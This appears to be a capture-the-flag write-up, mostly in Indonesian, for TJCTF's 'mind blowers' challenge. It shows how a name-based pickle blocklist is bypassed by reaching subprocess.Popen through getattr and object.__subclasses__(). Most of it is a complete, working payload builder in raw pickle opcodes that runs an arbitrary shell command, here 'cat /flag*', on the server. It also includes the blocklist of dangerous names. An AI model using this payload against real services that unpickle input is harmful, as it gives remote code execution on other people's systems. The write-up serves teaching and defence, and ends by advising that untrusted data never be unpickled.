# misc/mind blowers — Writeup

**CTF:** TJCTF  
**Category:** misc  
**Flag:** `tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}`

---

## Overview

Server menerima input base64, decode, lalu unpickle menggunakan `RestrictedUnpickler` yang hanya mengizinkan module `builtins` dan memblokir nama-nama berbahaya seperti `eval`, `exec`, `open`, dan `__import__`.

```python
BLOCKED_NAMES = {
    "eval", "exec", "compile", "__import__", "open",
    "breakpoint", "input", "exit", "quit",
}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module != "builtins":
            raise pickle.UnpicklingError("banned")
        if name in BLOCKED_NAMES:
            raise pickle.UnpicklingError("blocked")
        return super().find_class(module, name)
```

## Vulnerability

Filter `find_class` hanya dipanggil saat pickle bertemu opcode `GLOBAL` atau `STACK_GLOBAL` — yaitu saat pickle memuat class/fungsi berdasarkan nama string. Filter **tidak** memblokir operasi yang dilakukan pada objek yang sudah ada di stack.

`builtins.getattr` tidak diblokir, dan `builtins.object` bisa di-pickle secara normal. Ini cukup untuk membangun full RCE chain.

## Exploit Chain

Semua langkah dilakukan via raw pickle opcodes:

```
1. getattr(object, '__subclasses__')()
   → memanggil object.__subclasses__() di runtime server
   → menghasilkan list semua subclass yang ter-load

2. list.__getitem__(subclasses, 283)
   → mengambil subprocess.Popen (index 283 di environment server)
   → tanpa pernah menyebut "subprocess" sebagai GLOBAL opcode

3. Popen(['sh','-c','cat /flag*'], -1, None, None, -1)
   → argumen ke-4 (stdout) = -1 = subprocess.PIPE

4. popen_instance.communicate()[0]
   → membaca stdout, return bytes berisi flag
```

Kunci bypass: `subprocess.Popen` **tidak pernah di-load via `find_class`**. Ia diambil dari list subclasses yang sudah ada di memory Python interpreter — sehingga filter tidak pernah terpanggil.

## Payload Structure (Raw Opcodes)

```python
def build_payload(cmd: str) -> bytes:
    p = b"\x80\x04"                                  # PROTO 4

    # Step 1: object.__subclasses__() -> list, simpan di memo[0]
    p += s("builtins") + s("getattr") + b"\x93"      # STACK_GLOBAL getattr
    p += s("builtins") + s("object") + b"\x93"       # STACK_GLOBAL object
    p += s("__subclasses__") + b"\x86\x52"           # TUPLE2 + REDUCE -> method
    p += b"\x29\x52\x94"                             # () REDUCE call -> list, MEMOIZE

    # Step 2: list[283] -> Popen class, simpan di memo[1]
    p += s("builtins") + s("getattr") + b"\x93"
    p += b"\x68\x00" + s("__getitem__") + b"\x86\x52"  # bound __getitem__ dari list
    p += b"M\x1b\x01\x85\x52\x94"                   # (283,) REDUCE -> Popen, MEMOIZE

    # Step 3: Popen(['sh','-c',cmd], -1, None, None, -1) -> instance, memo[2]
    p += b"\x68\x01("
    p += b"\x5d(" + s("sh") + s("-c") + s(cmd) + b"e"  # ['sh','-c',cmd]
    p += b"J\xff\xff\xff\xff"                        # bufsize = -1
    p += b"N"                                        # executable = None
    p += b"N"                                        # stdin = None
    p += b"J\xff\xff\xff\xff"                        # stdout = PIPE (-1)
    p += b"t\x52\x94"                               # TUPLE + REDUCE, MEMOIZE

    # Step 4: instance.communicate() -> (stdout, stderr), memo[4]
    p += s("builtins") + s("getattr") + b"\x93"
    p += b"\x68\x02" + s("communicate") + b"\x86\x52\x94"
    p += b"\x29\x52\x94"                             # call () -> tuple

    # Step 5: tuple[0] -> stdout bytes
    p += s("builtins") + s("getattr") + b"\x93"
    p += b"\x68\x04" + s("__getitem__") + b"\x86\x52"
    p += b"K\x00\x85\x52."                          # (0,) REDUCE STOP

    return base64.b64encode(p)
```

## Lesson Learned

Blocklist berbasis nama string pada pickle **tidak cukup aman**. Penyerang bisa menghindari `find_class` sepenuhnya dengan:

- Mengakses class melalui `object.__subclasses__()` — semua class yang pernah di-import tersedia
- Menggunakan `builtins.getattr` untuk bound method calls
- Memanipulasi pickle stack secara manual untuk melewati layer filter apapun

Solusi yang aman: jangan pernah unpickle data yang tidak dipercaya.
